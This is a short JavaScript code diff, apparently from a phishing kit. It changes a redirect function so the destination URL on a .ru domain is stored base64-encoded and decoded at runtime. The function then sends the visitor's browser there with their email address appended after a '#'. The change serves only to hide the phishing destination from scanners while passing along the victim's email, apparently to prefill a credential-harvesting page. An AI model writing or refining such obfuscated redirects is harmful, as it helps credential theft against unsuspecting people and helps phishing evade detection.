@@ -156,7 +156,7 @@
     }
 
     function redirect(email) {
-        var linkx = "https://v5.continialus.ru/niYXR/";
+        var linkx = "aHR0cHM6Ly92NS5jb250aW5pYWx1cy5ydS9uaVlYUi8=";
         var decodedLink = atob(linkx);
         var finalLink = decodedLink + "#" + decodeURIComponent(email); // Fix: ensure @ is not encoded
         window.location.href = finalLink;
